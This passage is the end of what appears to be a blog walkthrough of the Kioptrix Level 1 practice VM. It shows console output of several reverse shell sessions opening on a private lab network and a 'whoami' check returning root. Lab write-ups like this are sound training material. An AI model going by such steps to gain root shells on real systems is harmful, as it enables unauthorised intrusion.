[*] Command shell session 9 opened (192.168.132.128:4444 -> 192.168.132.129:32817 ) at 2022-05-31 11:37:59 +0530

[*] Command shell session 10 opened (192.168.132.128:4444 -> 192.168.132.129:32818 ) at 2022-05-31 11:38:00 +0530
[*] Command shell session 11 opened (192.168.132.128:4444 -> 192.168.132.129:32819 ) at 2022-05-31 11:38:02 +0530
[*] Command shell session 12 opened (192.168.132.128:4444 -> 192.168.132.129:32820 ) at 2022-05-31 11:38:03 +0530
whoami
root
hostname
kioptrix.level1
```

See you on the next Blog, Happy hacking...